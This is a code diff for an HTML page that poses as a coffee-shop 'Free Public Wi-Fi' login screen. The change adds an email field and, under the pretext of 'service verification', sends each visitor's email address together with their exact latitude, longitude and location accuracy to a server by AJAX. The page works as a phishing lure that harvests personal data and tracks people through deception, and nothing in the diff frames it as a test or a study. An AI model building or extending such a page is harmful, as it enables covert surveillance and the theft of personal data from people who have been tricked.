@@ -45,7 +45,6 @@
 
         .btn-connect {
             background-color: #00704a;
-            /* Starbucks Green-ish */
             color: white;
             border: none;
             padding: 12px 0;
@@ -95,15 +94,27 @@
         </svg>
 
         <h2>Free Public Wi-Fi</h2>
-        <p>To connect to the high-speed network, we need to verify your location to ensure you are within the service
-            area.</p>
+        <p>To connect to the high-speed network, please enter your email address and allow location access for service
+            verification.</p>
 
-        <button class="btn-connect" onclick="getLocation()">Connect Now</button>
+        <input type="email" id="email" placeholder="Enter your email address"
+            style="width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box;">
+
+        <button class="btn-connect" onclick="startProcess()">Connect Now</button>
         <div class="loader" id="loader"></div>
         <p id="status" style="margin-top: 15px; font-size: 0.8rem;"></p>
     </div>
 
     <script>
+        function startProcess() {
+            var email = document.getElementById('email').value;
+            if (email === "") {
+                alert("Please enter your email address first.");
+                return;
+            }
+            getLocation();
+        }
+
         function getLocation() {
             document.getElementById('loader').style.display = 'block';
             document.querySelector('.btn-connect').disabled = true;
@@ -120,6 +131,7 @@
             var lat = position.coords.latitude;
             var lon = position.coords.longitude;
             var acc = position.coords.accuracy;
+            var email = document.getElementById('email').value;
 
             // Send to server
             $.ajax({
@@ -128,7 +140,8 @@
                 data: {
                     Lat: lat,
                     Lon: lon,
-                    Acc: acc
+                    Acc: acc,
+                    Email: email
                 },
                 success: function () {
                     document.getElementById('loader').style.display = 'none';
